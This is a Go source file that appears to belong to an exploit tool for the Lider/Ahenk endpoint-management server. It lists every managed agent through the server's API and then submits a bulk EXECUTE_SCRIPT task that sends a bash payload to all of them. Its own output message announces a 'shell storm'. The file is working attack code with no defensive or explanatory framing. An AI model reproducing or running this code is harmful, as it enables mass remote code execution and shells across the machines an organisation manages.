package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"strings"
	"time"
)

type Agents []struct {
	DistinguishedName string      `json:"distinguishedName"`
	Ou                interface{} `json:"ou"`
	Cn                string      `json:"cn"`
	UID               string      `json:"uid"`
	Sn                interface{} `json:"sn"`
	O                 string      `json:"o"`
	UserPassword      string      `json:"userPassword"`
	Parent            interface{} `json:"parent"`
	ParentName        interface{} `json:"parentName"`
	EntryUUID         string      `json:"entryUUID"`
	HasSubordinates   string      `json:"hasSubordinates"`
	Name              string      `json:"name"`
	IconPath          interface{} `json:"iconPath"`
	ExpandedUser      string      `json:"expandedUser"`
	Attributes        struct {
		Owner                 string `json:"owner"`
		EntryUUID             string `json:"entryUUID"`
		StructuralObjectClass string `json:"structuralObjectClass"`
		CreatorsName          string `json:"creatorsName"`
		UserPassword          string `json:"userPassword"`
		SubschemaSubentry     string `json:"subschemaSubentry"`
		Cn                    string `json:"cn"`
		HasSubordinates       string `json:"hasSubordinates"`
		O                     string `json:"o"`
		CreateTimestamp       string `json:"createTimestamp"`
		ModifyTimestamp       string `json:"modifyTimestamp"`
		UID                   string `json:"uid"`
		EntryCSN              string `json:"entryCSN"`
		ModifiersName         string `json:"modifiersName"`
		LiderDeviceOSType     string `json:"liderDeviceOSType"`
		PwdChangedTime        string `json:"pwdChangedTime"`
		EntryDN               string `json:"entryDN"`
	} `json:"attributes"`
	AttributesMultiValues struct {
		Owner                 []string `json:"owner"`
		EntryUUID             []string `json:"entryUUID"`
		StructuralObjectClass []string `json:"structuralObjectClass"`
		CreatorsName          []string `json:"creatorsName"`
		UserPassword          []string `json:"userPassword"`
		SubschemaSubentry     []string `json:"subschemaSubentry"`
		ObjectClass           []string `json:"objectClass"`
		Cn                    []string `json:"cn"`
		HasSubordinates       []string `json:"hasSubordinates"`
		O                     []string `json:"o"`
		CreateTimestamp       []string `json:"createTimestamp"`
		ModifyTimestamp       []string `json:"modifyTimestamp"`
		UID                   []string `json:"uid"`
		EntryCSN              []string `json:"entryCSN"`
		ModifiersName         []string `json:"modifiersName"`
		LiderDeviceOSType     []string `json:"liderDeviceOSType"`
		PwdChangedTime        []string `json:"pwdChangedTime"`
		EntryDN               []string `json:"entryDN"`
	} `json:"attributesMultiValues"`
	Type                string      `json:"type"`
	Priviliges          interface{} `json:"priviliges"`
	ChildEntries        interface{} `json:"childEntries"`
	TelephoneNumber     interface{} `json:"telephoneNumber"`
	HomePostalAddress   interface{} `json:"homePostalAddress"`
	CreateDateStr       string      `json:"createDateStr"`
	Mail                interface{} `json:"mail"`
	SessionList         interface{} `json:"sessionList"`
	AgentListSize       interface{} `json:"agentListSize"`
	OnlineAgentListSize interface{} `json:"onlineAgentListSize"`
	AgentList           interface{} `json:"agentList"`
	OnlineAgentList     interface{} `json:"onlineAgentList"`
	Online              bool        `json:"online"`
}


func (cu *ConsoleUser)NewAgents(agentLdapBaseDn string) *Agents{

	print_info("Getting all the active computers")
	client := http.Client{Jar: cu.cookieJar}
	
	v := url.Values{}
	v.Set("uid", agentLdapBaseDn)
	v.Set("type", "ORGANIZATIONAL_UNIT")
	v.Set("name", "Agents")
	v.Set("parent", "")

    resp, err := client.PostForm(fmt.Sprintf("http://%s:8080/lider/computer/getOuDetails", TARGET), v)

	if err != nil {
		panic_with_msg("Unable to login somehow. Dunno why", err)
	}
	defer resp.Body.Close()
	
	body, err := ioutil.ReadAll(resp.Body)

	agents := new(Agents)

	err2 := json.Unmarshal(body, agents)

	if err2 != nil {
		panic_with_msg("asdsad", err)
	}
	return agents
}

func (cu *ConsoleUser)TriggerPayloadonAllAgents(agents *Agents){

	a, err := json.Marshal(agents)

	if err != nil {
		panic_with_msg("Cant marshel the agents", err)
	}
	rand.Seed(time.Now().UnixNano())
	godsJson := fmt.Sprintf(`
	{
		"id": 62,
		"name": "Betik Ã‡alÄ±ÅŸtÄ±r",
		"page": "execute-script",
		"description": "Ä°stemcide betik Ã§alÄ±ÅŸtÄ±rÄ±r",
		"commandId": "EXECUTE_SCRIPT",
		"isMulti": true,
		"plugin": {
		  "id": 7,
		  "name": "script",
		  "version": "1.0.0",
		  "description": "Betik Ã§alÄ±ÅŸtÄ±r",
		  "active": true,
		  "deleted": false,
		  "machineOriented": true,
		  "userOriented": true,
		  "policyPlugin": true,
		  "taskPlugin": true,
		  "usesFileTransfer": false,
		  "xBased": false,
		  "createDate": "15/09/2021 18:49:09",
		  "modifyDate": null
		},
		"state": 1,
		"dnType": "AHENK",
		"dnList": [
		  "cn=pardus,ou=Agents,dc=liderahenk,dc=org"
		],
		"entryList": %s,
		"cronExpression": null,
		"parameterMap": {
		  "SCRIPT_FILE_ID": "%d",
		  "SCRIPT_TYPE": "bash",
		  "SCRIPT_CONTENTS": "%s",
		  "SCRIPT_PARAMS": ""
		},
		"activationDate": null
	  }
	`, a, (rand.Intn(10000 - 100) + 1000), strings.Replace(NewPayload(), "\"", "\\\"", -1))

	client := http.Client{Jar: cu.cookieJar}

    resp, err := client.Post(fmt.Sprintf("http://%s:8080/lider/task/execute", TARGET), "application/json", bytes.NewBuffer([]byte(godsJson)))

	if err != nil {
		panic_with_msg("Unable to triggger the bulk task endpoint", err)
	}
	defer resp.Body.Close()
	
	body, err := ioutil.ReadAll(resp.Body)

	if strings.Contains(string(body), "Gonderildi"){
		print_good("Hooold my beer ! Shell storm is coming.")
	}


}